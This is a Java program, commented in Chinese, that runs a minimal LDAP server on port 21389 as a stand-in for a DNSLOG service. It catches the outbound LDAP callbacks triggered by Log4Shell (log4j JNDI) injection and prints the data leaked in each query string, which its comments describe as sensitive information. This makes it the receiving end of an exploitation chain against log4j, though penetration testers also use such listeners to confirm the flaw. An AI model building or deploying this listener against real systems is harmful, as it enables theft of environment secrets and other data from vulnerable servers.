package tools;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * 替代 DNSLOG 平台接收 log4j 漏洞泄露的信息。
 * 注意；因为大体量的报文的结构不一样，目前该脚本只解析了小体量的报文，小体量的报文从中提取敏感信息并打印，
 *      大体量的报文则直接打印所有数据

 */
public class LdapString {
    public static void main(String[] args) {
        // 1.创建 socket，监听端口，等待请求
        ServerSocket serverSocket;
        Socket socket = null;
        BufferedInputStream in;
        BufferedOutputStream out;

        String string;

        SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");

        try {
            serverSocket = new ServerSocket(21389);
            System.out.println("listening on " + serverSocket.getLocalSocketAddress());

            while (true) {

                // 1.接收请求
                socket = serverSocket.accept();

                System.out.print(format.format(new Date()) +" accepted from " + socket.getRemoteSocketAddress());

                in = new BufferedInputStream(socket.getInputStream());
                out = new BufferedOutputStream(socket.getOutputStream());

                // 2.判断接收的第一个报文是否为 LDAP 协议的报文
                byte[] data = new byte[14];
                in.read(data);

                if (!isLdap(data)) {
                    System.out.println("The message is not LDAP.");
                    continue;
                }

                // 3.发送响应报文，固定数据
                out.write(getResponseMessage());
                out.flush();

                // 4.接收 LDAP 查询报文，解析并提取查询字符串
                in = new BufferedInputStream(socket.getInputStream());
                string = getInformation(in);

                System.out.println(". The string is: " + string);

                close(socket);
            }

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            close(socket);
        }
    }

    /**
     * 判断接收的第一个报文是否为 LDAP 协议的报文
     * @param data
     * @return
     */
    private static boolean isLdap(byte[] data) {
        // 300c020101600702010304008000
        String signString = "300c020101600702010304008000";
        byte[] signBytes = new byte[14];

        for (int i = 0; i < signString.length(); i = i + 2) {
            signBytes[i / 2] = (byte) Integer.parseInt(signString.substring(i, i + 2), 16);
        }

        // 比较 LDAP 协议特征和收到的响应报文
        for (int i = 0; i < data.length; i++) {
            if (signBytes[i] != data[i]) {
                return false;
            }
        }

        return true;
    }

    /**
     * 构造接收的第一个报文对应的响应报文，发送给目标
     * @return
     */
    private static byte[] getResponseMessage() {
        String responseString = "300c02010161070a010004000400";
        byte[] responseBytes = new byte[14];

        for (int i = 0; i < responseString.length(); i = i + 2) {
            responseBytes[i / 2] = (byte) Integer.parseInt(responseString.substring(i, i + 2), 16);
        }

        return responseBytes;
    }

    /**
     * 获取泄露的敏感信息
     * @param inputStream
     * @return
     * @throws IOException
     */
    private static String getInformation(InputStream inputStream) throws IOException {

        BufferedInputStream in = new BufferedInputStream(inputStream);

        byte[] buffer = new byte[65536];
        int dataLength = in.read(buffer);

        // 不超过 1024 个字节，提取敏感信息，超过则直接打印报文所有的信息
        if (dataLength < 1024) {
            int stringLength = buffer[8];
            return new String(buffer, 9, stringLength);
        }

        return new String(buffer);
    }

    /**
     * 关闭流和 socket
     * @param socket
     */
    private static void close(Socket socket) {
        try {
            if (socket != null) {
                socket.close();
            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
